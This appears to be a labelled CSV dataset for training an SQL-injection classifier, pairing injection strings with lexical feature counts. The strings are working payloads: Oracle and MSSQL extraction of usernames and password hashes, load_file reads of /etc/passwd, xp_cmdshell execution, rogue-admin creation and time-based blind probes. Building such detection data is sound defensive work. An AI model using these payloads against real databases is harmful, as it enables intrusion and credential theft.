Sentence,Label,query_len,num_words_query,no_single_qts,no_double_qts,no_punct,no_single_cmnt,no_mult_cmnt,no_space,no_perc,no_log_opt,no_arith,no_null,no_hexa,no_alpha,no_digit,len_of_chr_char_null,genuine_keywords
' and 1 = utl_inaddr.get_host_address  (  (  select count ( distinct ( username  )  )   from sys.all_users  )  )   and 'i' = 'i,1,127,23,4,0,20,0,0,22,0,2,0,0,0,73,1,0,2
' and 1 = utl_inaddr.get_host_address  (  (  select count ( distinct ( password  )  )   from sys.user$  )  )   and 'i' = 'i,1,123,23,4,0,20,0,0,22,0,2,0,0,0,69,1,0,2
' and 1 = utl_inaddr.get_host_address  (  (  select count ( distinct ( table_name  )  )   from sys.all_tables  )  )   and 'i' = 'i,1,130,23,4,0,21,0,0,22,0,2,0,0,0,75,1,0,2
' and 1 = utl_inaddr.get_host_address  (  (  select count ( distinct ( column_name  )  )   from sys.all_tab_columns  )  )   and 'i' = 'i,1,136,23,4,0,22,0,0,22,0,2,0,0,0,80,1,0,2
' and 1 = utl_inaddr.get_host_address  (  (  select count ( distinct ( granted_role  )  )   from dba_role_privs where grantee = sys.login_user  )  )   and 'i' = 'i,1,163,27,4,0,24,0,0,26,0,2,0,0,0,101,1,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( username )  from  ( select distinct ( username ) , rownum as limit from sys.all_users )  where limit = 1  )  )   and 'i' = 'i",1,188,36,4,0,24,0,0,35,0,2,0,0,0,117,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( password )  from  ( select distinct ( password ) , rownum as limit from sys.user$ )  where limit = 1  )  )   and 'i' = 'i",1,184,36,4,0,24,0,0,35,0,2,0,0,0,113,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( table_name )  from  ( select distinct ( table_name ) , rownum as limit from sys.all_tables )  where limit = 1  )  )   and 'i' = 'i",1,193,36,4,0,26,0,0,35,0,2,0,0,0,120,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( column_name )  from  ( select distinct ( column_name ) , rownum as limit from all_tab_columns )  where limit = 1  )  )   and 'i' = 'i",1,196,36,4,0,26,0,0,35,0,2,0,0,0,123,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( granted_role )  from  ( select distinct ( granted_role ) , rownum as limit from dba_role_privs where grantee = sys.loginuser )  where limit = 1  )  )   and 'i' = 'i",1,227,40,4,0,28,0,0,39,0,2,0,0,0,148,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( username )  from  ( select distinct ( username ) , rownum as limit from sys.all_users )  where limit = 2  )  )   and 'i' = 'i",1,188,36,4,0,24,0,0,35,0,2,0,0,0,117,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( password )  from  ( select distinct ( password ) , rownum as limit from sys.user$ )  where limit = 2  )  )   and 'i' = 'i",1,184,36,4,0,24,0,0,35,0,2,0,0,0,113,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( table_name )  from  ( select distinct ( table_name ) , rownum as limit from sys.all_tables )  where limit = 2  )  )   and 'i' = 'i",1,193,36,4,0,26,0,0,35,0,2,0,0,0,120,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( column_name )  from  ( select distinct ( column_name ) , rownum as limit from all_tab_columns )  where limit = 2  )  )   and 'i' = 'i",1,196,36,4,0,26,0,0,35,0,2,0,0,0,123,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( granted_role )  from  ( select distinct ( granted_role ) , rownum as limit from dba_role_privs where grantee = sys.loginuser )  where limit = 2  )  )   and 'i' = 'i",1,227,40,4,0,28,0,0,39,0,2,0,0,0,148,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( username )  from  ( select distinct ( username ) , rownum as limit from sys.all_users )  where limit = 3  )  )   and 'i' = 'i",1,188,36,4,0,24,0,0,35,0,2,0,0,0,117,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( password )  from  ( select distinct ( password ) , rownum as limit from sys.user$ )  where limit = 3  )  )   and 'i' = 'i",1,184,36,4,0,24,0,0,35,0,2,0,0,0,113,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( table_name )  from  ( select distinct ( table_name ) , rownum as limit from sys.all_tables )  where limit = 3  )  )   and 'i' = 'i",1,193,36,4,0,26,0,0,35,0,2,0,0,0,120,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( column_name )  from  ( select distinct ( column_name ) , rownum as limit from all_tab_columns )  where limit = 3  )  )   and 'i' = 'i",1,196,36,4,0,26,0,0,35,0,2,0,0,0,123,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( granted_role )  from  ( select distinct ( granted_role ) , rownum as limit from dba_role_privs where grantee = sys.loginuser )  where limit = 3  )  )   and 'i' = 'i",1,227,40,4,0,28,0,0,39,0,2,0,0,0,148,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( username )  from  ( select distinct ( username ) , rownum as limit from sys.all_users )  where limit = 4  )  )   and 'i' = 'i",1,188,36,4,0,24,0,0,35,0,2,0,0,0,117,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( password )  from  ( select distinct ( password ) , rownum as limit from sys.user$ )  where limit = 4  )  )   and 'i' = 'i",1,184,36,4,0,24,0,0,35,0,2,0,0,0,113,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( table_name )  from  ( select distinct ( table_name ) , rownum as limit from sys.all_tables )  where limit = 4  )  )   and 'i' = 'i",1,193,36,4,0,26,0,0,35,0,2,0,0,0,120,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( column_name )  from  ( select distinct ( column_name ) , rownum as limit from all_tab_columns )  where limit = 4  )  )   and 'i' = 'i",1,196,36,4,0,26,0,0,35,0,2,0,0,0,123,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( granted_role )  from  ( select distinct ( granted_role ) , rownum as limit from dba_role_privs where grantee = sys.loginuser )  where limit = 4  )  )   and 'i' = 'i",1,227,40,4,0,28,0,0,39,0,2,0,0,0,148,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( username )  from  ( select distinct ( username ) , rownum as limit from sys.all_users )  where limit = 5  )  )   and 'i' = 'i",1,188,36,4,0,24,0,0,35,0,2,0,0,0,117,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( password )  from  ( select distinct ( password ) , rownum as limit from sys.user$ )  where limit = 5  )  )   and 'i' = 'i",1,184,36,4,0,24,0,0,35,0,2,0,0,0,113,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( table_name )  from  ( select distinct ( table_name ) , rownum as limit from sys.all_tables )  where limit = 5  )  )   and 'i' = 'i",1,193,36,4,0,26,0,0,35,0,2,0,0,0,120,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( column_name )  from  ( select distinct ( column_name ) , rownum as limit from all_tab_columns )  where limit = 5  )  )   and 'i' = 'i",1,196,36,4,0,26,0,0,35,0,2,0,0,0,123,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( granted_role )  from  ( select distinct ( granted_role ) , rownum as limit from dba_role_privs where grantee = sys.loginuser )  where limit = 5  )  )   and 'i' = 'i",1,227,40,4,0,28,0,0,39,0,2,0,0,0,148,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( username )  from  ( select distinct ( username ) , rownum as limit from sys.all_users )  where limit = 6  )  )   and 'i' = 'i",1,188,36,4,0,24,0,0,35,0,2,0,0,0,117,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( password )  from  ( select distinct ( password ) , rownum as limit from sys.user$ )  where limit = 6  )  )   and 'i' = 'i",1,184,36,4,0,24,0,0,35,0,2,0,0,0,113,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( table_name )  from  ( select distinct ( table_name ) , rownum as limit from sys.all_tables )  where limit = 6  )  )   and 'i' = 'i",1,193,36,4,0,26,0,0,35,0,2,0,0,0,120,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( column_name )  from  ( select distinct ( column_name ) , rownum as limit from all_tab_columns )  where limit = 6  )  )   and 'i' = 'i",1,196,36,4,0,26,0,0,35,0,2,0,0,0,123,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( granted_role )  from  ( select distinct ( granted_role ) , rownum as limit from dba_role_privs where grantee = sys.loginuser )  where limit = 6  )  )   and 'i' = 'i",1,227,40,4,0,28,0,0,39,0,2,0,0,0,148,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( username )  from  ( select distinct ( username ) , rownum as limit from sys.all_users )  where limit = 7  )  )   and 'i' = 'i",1,188,36,4,0,24,0,0,35,0,2,0,0,0,117,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( password )  from  ( select distinct ( password ) , rownum as limit from sys.user$ )  where limit = 7  )  )   and 'i' = 'i",1,184,36,4,0,24,0,0,35,0,2,0,0,0,113,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( table_name )  from  ( select distinct ( table_name ) , rownum as limit from sys.all_tables )  where limit = 7  )  )   and 'i' = 'i",1,193,36,4,0,26,0,0,35,0,2,0,0,0,120,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( column_name )  from  ( select distinct ( column_name ) , rownum as limit from all_tab_columns )  where limit = 7  )  )   and 'i' = 'i",1,196,36,4,0,26,0,0,35,0,2,0,0,0,123,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( granted_role )  from  ( select distinct ( granted_role ) , rownum as limit from dba_role_privs where grantee = sys.loginuser )  where limit = 7  )  )   and 'i' = 'i",1,227,40,4,0,28,0,0,39,0,2,0,0,0,148,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( username )  from  ( select distinct ( username ) , rownum as limit from sys.all_users )  where limit = 8  )  )   and 'i' = 'i",1,188,36,4,0,24,0,0,35,0,2,0,0,0,117,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( password )  from  ( select distinct ( password ) , rownum as limit from sys.user$ )  where limit = 8  )  )   and 'i' = 'i",1,184,36,4,0,24,0,0,35,0,2,0,0,0,113,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( table_name )  from  ( select distinct ( table_name ) , rownum as limit from sys.all_tables )  where limit = 8  )  )   and 'i' = 'i",1,193,36,4,0,26,0,0,35,0,2,0,0,0,120,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( column_name )  from  ( select distinct ( column_name ) , rownum as limit from all_tab_columns )  where limit = 8  )  )   and 'i' = 'i",1,196,36,4,0,26,0,0,35,0,2,0,0,0,123,2,0,2
"' and 1 = utl_inaddr.get_host_address  (  (  select distinct ( granted_role )  from  ( select distinct ( granted_role ) , rownum as limit from dba_role_privs where grantee = sys.loginuser )  where limit = 8  )  )   and 'i' = 'i",1,227,40,4,0,28,0,0,39,0,2,0,0,0,148,2,0,2
"'|| ( elt ( -3+5,bin ( 15 ) ,ord ( 10 ) ,hex ( char ( 45  )  )    )  )  ",1,72,21,1,0,20,0,0,21,0,1,2,0,0,16,8,1,0
'||'6,1,5,1,2,0,4,0,0,0,0,1,0,0,0,0,1,0,0
' or 1 = 1-- ,1,13,5,1,0,4,1,0,5,0,1,2,0,0,2,2,0,0
' -- ,1,5,2,1,0,3,1,0,2,0,0,2,0,0,0,0,0,0
' or 1 = 1 /*,1,13,6,1,0,4,0,1,5,0,1,0,0,0,2,2,0,0
' or 'a' = 'a,1,13,5,4,0,5,0,0,4,0,1,0,0,0,4,0,0,0
' select * from information_schema.tables--,1,43,5,1,0,6,1,0,4,0,0,3,0,0,33,0,0,1
' group by userid having 1 = 1--,1,32,8,1,0,4,1,0,7,0,0,2,0,0,19,2,0,0
' select name from syscolumns where id  =   ( select id from sysobjects where name  =  tablename' ) --,1,102,19,2,0,8,1,0,18,0,0,2,0,0,71,0,0,2
' or 1 in  ( select @@version ) --,1,34,9,1,0,7,1,0,8,0,1,2,0,0,17,1,0,1
' union all select @@version--,1,30,5,1,0,5,1,0,4,0,0,2,0,0,21,0,0,1
' or 'unusual'  =  'unusual',1,28,5,5,0,6,0,0,4,0,1,0,0,0,16,0,0,0
' or 'something'  =  'some'+'thing',1,35,5,7,0,9,0,0,4,0,1,1,0,0,20,0,0,0
' or 'text'  =  n'text',1,23,5,5,0,6,0,0,4,0,1,0,0,0,11,0,0,0
' or 'something' like 'some%',1,29,5,5,0,6,0,0,4,1,1,0,0,0,19,0,0,0
' or 2 > 1,1,10,5,1,0,2,0,0,4,0,1,0,0,0,2,2,0,0
' or 'text' > 't',1,17,5,5,0,6,0,0,4,0,1,0,0,0,7,0,0,0
' or 'whatever' in  ( 'whatever' ) ,1,35,7,5,0,7,0,0,7,0,1,0,0,0,20,0,0,0
' or 2 between 1 and 3,1,22,7,1,0,1,0,0,6,0,2,0,0,0,12,3,0,0
' or username like char ( 37 ) ;,1,32,9,1,0,4,0,0,8,0,1,0,0,0,18,2,1,0
"' union select * from users where login  =  char ( 114,111,111,116 ) ;",1,70,14,1,0,9,0,0,13,0,0,1,0,0,34,12,1,1
' union select ,1,15,3,1,0,1,0,0,3,0,0,0,0,0,11,0,0,1
'; execute immediate 'sel' || 'ect us' || 'er',1,46,9,7,0,12,0,0,8,0,2,0,0,0,26,0,0,0
'; exec  ( 'sel' + 'ect us' + 'er' ) ,1,37,10,7,0,12,0,0,10,0,0,2,0,0,14,0,0,0
'/**/or/**/1/**/ = /**/1,1,24,3,1,0,18,0,4,2,0,0,8,0,0,2,2,0,0
' or 1/*,1,8,3,1,0,3,0,1,2,0,1,0,0,0,2,1,0,0
 or isnull ( 1/0 )  /*,1,22,6,0,0,5,0,1,6,0,1,1,1,0,8,2,1,0
' -- &password = ,1,17,4,1,0,5,1,0,4,0,0,2,0,0,8,0,0,0
'; begin declare @var varchar ( 8000 )  set @var = ':' select @var = @var+'+login+'/'+password+' ' from users where login > ,1,124,22,8,0,25,0,0,22,0,0,6,0,0,72,4,1,1
' and 1 in  ( select var from temp ) --,1,39,11,1,0,5,1,0,10,0,1,2,0,0,22,1,0,1
"' union select 1,load_file ( '/etc/passwd' ) ,1,1,1;",1,52,8,3,0,13,0,0,7,0,0,2,0,0,28,4,0,1
"1; ( load_file ( char ( 47,101,116,99,47,112,97,115,115,119,100  )  )   ) ,1,1,1;",1,81,11,0,0,22,0,0,10,0,0,0,0,0,12,33,1,0
"' and 1 =  (  if  (  (  load_file ( char ( 110,46,101,120,116  )  )  <>char ( 39,39  )  )  ,1,0  )  )  ;",1,104,24,1,0,25,0,0,23,0,1,0,0,0,21,21,2,0
'; exec master..xp_cmdshell 'ping 10.10.1.2'--,1,46,5,3,0,12,1,0,4,0,0,2,0,0,24,6,0,0
create user name identified by 'pass123',1,40,6,2,0,2,0,0,5,0,0,0,0,0,30,3,0,0
create user name identified by pass123 temporary tablespace temp default tablespace users; ,1,91,12,0,0,1,0,0,12,0,0,0,0,0,75,3,0,0
' ; drop table temp --,1,22,6,1,0,4,1,0,5,0,0,2,0,0,13,0,0,0
"exec sp_addlogin 'name' , 'password'",1,36,5,4,0,6,0,0,4,0,0,0,0,0,26,0,0,0
"exec sp_addsrvrolemember 'name' , 'sysadmin'",1,44,5,4,0,6,0,0,4,0,0,0,0,0,34,0,0,0
"insert into mysql.user  ( user, host, password )  values  ( 'name', 'localhost', password ( 'pass123'  )  )  ",1,109,17,6,0,17,0,0,17,0,0,0,0,0,66,3,0,0
grant connect to name; grant resource to name;,1,46,8,0,0,2,0,0,7,0,0,0,0,0,37,0,0,0
"insert into users ( login, password, level )  values (  char ( 0x70 )  + char ( 0x65 )  + char ( 0x74 )  + char ( 0x65 )  + char ( 0x72 )  + char ( 0x70 )  + char ( 0x65 )  + char ( 0x74 )  + char ( 0x65 )  + char ( 0x72 ) ,char ( 0x64 ) ",1,238,63,0,0,37,0,0,63,0,0,9,0,11,94,33,11,0
' or 1 = 1 --,1,13,6,1,0,4,1,0,5,0,1,2,0,0,2,2,0,0
' union  ( select @@version )  --,1,33,7,1,0,7,1,0,6,0,0,2,0,0,18,0,0,1
"' union  ( select null,  ( select @@version  )  )   --",1,54,11,1,0,10,1,0,10,0,0,2,1,0,28,0,1,2
"' union  ( select null, null,  ( select @@version  )  )   --",1,60,12,1,0,11,1,0,11,0,0,2,2,0,32,0,2,2
"' union  ( select null, null, null,   ( select @@version  )  )   --",1,67,13,1,0,12,1,0,12,0,0,2,3,0,36,0,3,2
"' union  ( select null, null, null, null,   ( select @@version  )  )   --",1,73,14,1,0,13,1,0,13,0,0,2,4,0,40,0,4,2
"' union  ( select null, null, null, null,  null,  ( select @@version  )  )   --",1,79,15,1,0,14,1,0,14,0,0,2,5,0,44,0,5,2
"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 0 )  waitfor delay '0:0:2' --",1,89,19,3,0,20,1,0,18,0,1,2,0,0,39,7,0,1
"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 5 )  waitfor delay '0:0:2' --",1,89,19,3,0,20,1,0,18,0,1,2,0,0,39,7,0,1
"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 8 )  waitfor delay '0:0:2' --",1,89,19,3,0,20,1,0,18,0,1,2,0,0,39,7,0,1
"'; if not ( substring  (  (  select @@version ) ,24,1 )  <> 1 )  waitfor delay '0:0:2' --",1,89,19,3,0,20,1,0,18,0,1,2,0,0,39,7,0,1
'; if not ( select system_user )  <> 'sa' waitfor delay '0:0:2' --,1,66,13,5,0,15,1,0,12,0,1,2,0,0,35,3,0,1
'; if is_srvrolemember ( 'sysadmin' )  > 0 waitfor delay '0:0:2' -- ,1,68,12,5,0,14,1,0,12,0,0,2,0,0,37,4,0,0
'; if not  (  (  select serverproperty ( 'isintegratedsecurityonly'  )  )   <> 1 )  waitfor delay '0:0:2' --,1,108,18,5,0,18,1,0,17,0,1,2,0,0,61,4,0,1
'; if not  (  (  select serverproperty ( 'isintegratedsecurityonly'  )  )   <> 0 )  waitfor delay '0:0:2' --,1,108,18,5,0,18,1,0,17,0,1,2,0,0,61,4,0,1
" select * from users where id = 1 or  ( \ )  = 1 union select 1,@@version -- 1",1,78,19,0,0,10,1,0,19,0,1,3,0,0,42,4,0,2
" select * from users where id = 1 or  ( \. )  = 1 union select 1,@@version -- 1",1,79,19,0,0,11,1,0,19,0,1,3,0,0,42,4,0,2
 select * from users where id = 1 or  ( \+ )  = 1 or 1 = 1 -- 1,1,63,20,0,0,9,1,0,20,0,2,4,0,0,26,5,0,1
" select * from users where id = 1 or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1",1,107,25,0,0,10,1,0,25,0,1,3,0,0,64,6,0,2
" select * from users where id = 1 or  ( \+ )  = 1 union select 1,@@version -- 1",1,79,19,0,0,11,1,0,19,0,1,4,0,0,42,4,0,2
 select * from users where id = 1 or  ( $+ )  = 1 or 1 = 1 -- 1,1,63,20,0,0,10,1,0,20,0,2,4,0,0,26,5,0,1
" select * from users where id = 1 or  ( $+ )  = 1 union select 1,@@version -- 1",1,79,19,0,0,12,1,0,19,0,1,4,0,0,42,4,0,2
 select * from users where id = 1 or \.<\ or 1 = 1 -- 1,1,55,16,0,0,7,1,0,16,0,2,3,0,0,26,4,0,1
 select * from users where id = 1 or \.<1 or 1 = 1 -- 1,1,55,16,0,0,7,1,0,16,0,2,3,0,0,26,5,0,1
" select * from users where id = 1 or \.<1 union select 1,@@version -- 1",1,71,15,0,0,9,1,0,15,0,1,3,0,0,42,4,0,2
" select * from users where id = 1 or \.<\ union select 1,@@version -- 1",1,71,15,0,0,9,1,0,15,0,1,3,0,0,42,3,0,2
 select * from users where id = 1 or \.<$ or 1 = 1 -- 1,1,55,16,0,0,8,1,0,16,0,2,3,0,0,26,4,0,1
" select * from users where id = 1 or \.<$ union select 1,@@version -- 1",1,71,15,0,0,10,1,0,15,0,1,3,0,0,42,3,0,2
" select * from users where id = 1 or \.<  = 1 union select 1,@@version -- 1",1,75,17,0,0,10,1,0,17,0,1,3,0,0,42,4,0,2
" select * from users where id = 1 ||1 union select 1,banner from v$version where rownum = 1 -- 1",1,96,20,0,0,9,1,0,20,0,1,3,0,0,62,5,0,2
" select * from users where id = 1 ||1 union select null,banner from v$version where rownum = 1 -- 1",1,99,20,0,0,9,1,0,20,0,1,3,1,0,66,4,1,2
 select * from users where id = 1   or 1 = 1 -- 1,1,49,14,0,0,5,1,0,14,0,1,3,0,0,24,4,0,1
 select * from users where id = 1 or \+<\ or 1 = 1 -- 1,1,55,16,0,0,7,1,0,16,0,2,4,0,0,26,4,0,1
" select * from users where id = 1 or  1<@ = 1 union select 1,version (  )  -- 1",1,79,19,0,0,10,1,0,19,0,1,3,0,0,42,5,0,2
" select * from users where id = 1 or \+<\ union select 1,@@version -- 1",1,71,15,0,0,9,1,0,15,0,1,4,0,0,42,3,0,2
" select * from users where id = 1 or \+<$ union select 1,@@version -- 1",1,71,15,0,0,10,1,0,15,0,1,4,0,0,42,3,0,2
" select * from users where id = 1 or 1&@# = 1 union select 1,version (  )  -- 1",1,79,19,0,0,11,1,0,19,0,1,3,0,0,42,5,0,2
" select * from users where id = 1 or $ . = 1 union select 1,@@version -- 1",1,74,18,0,0,10,1,0,18,0,1,3,0,0,42,4,0,2
 select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1,1,58,19,0,0,7,1,0,19,0,2,3,0,0,26,6,0,1
" select * from users where id = 1 or $ 1 = 1 union select 1,@@version -- 1",1,74,18,0,0,9,1,0,18,0,1,3,0,0,42,5,0,2
 select * from users where id = 1 or $<\ or 1 = 1 -- 1,1,54,16,0,0,7,1,0,16,0,2,3,0,0,26,4,0,1
 select * from users where id = 1 or $<\. or 1 = 1 -- 1,1,55,16,0,0,8,1,0,16,0,2,3,0,0,26,4,0,1
" select * from users where id = 1 or $<\. union select 1,@@version -- 1",1,71,15,0,0,10,1,0,15,0,1,3,0,0,42,3,0,2
" select * from users where id = 1 or $<\ union select 1,@@version -- 1",1,70,15,0,0,9,1,0,15,0,1,3,0,0,42,3,0,2
 select * from users where id = 1 or $+<\ or 1 = 1 -- 1,1,55,16,0,0,8,1,0,16,0,2,4,0,0,26,4,0,1
" select * from users where id = 1 or $+<1 union select 1,@@version -- 1",1,71,15,0,0,10,1,0,15,0,1,4,0,0,42,4,0,2
" select * from users where id = 1 or $+<\ union select 1,@@version -- 1",1,71,15,0,0,10,1,0,15,0,1,4,0,0,42,3,0,2
" select * from users where id = 1 or $+<$ union select 1,@@version -- 1",1,71,15,0,0,11,1,0,15,0,1,4,0,0,42,3,0,2
 select * from users where id = 1 or \<\. or 1 = 1 -- 1,1,55,16,0,0,7,1,0,16,0,2,3,0,0,26,4,0,1
" select * from users where id = 1 or \<\. union select 1,@@version -- 1",1,71,15,0,0,9,1,0,15,0,1,3,0,0,42,3,0,2
 select * from users where id = 1 or \<1 or 1 = 1 -- 1,1,54,16,0,0,6,1,0,16,0,2,3,0,0,26,5,0,1
" select * from users where id = 1 or \<1 union select 1,@@version -- 1",1,70,15,0,0,8,1,0,15,0,1,3,0,0,42,4,0,2
" select * from users where id = 1 or \<\ union select 1,@@version -- 1",1,70,15,0,0,8,1,0,15,0,1,3,0,0,42,3,0,2
" select * from users where id = 1 or \<\ union select null,@@version -- 1",1,73,15,0,0,8,1,0,15,0,1,3,1,0,46,2,1,2
 select * from users where id = 1 or \<$ or 1 = 1 -- 1,1,54,16,0,0,7,1,0,16,0,2,3,0,0,26,4,0,1
" select * from users where id = 1 or \<$ union select 1,@@version -- 1",1,70,15,0,0,9,1,0,15,0,1,3,0,0,42,3,0,2
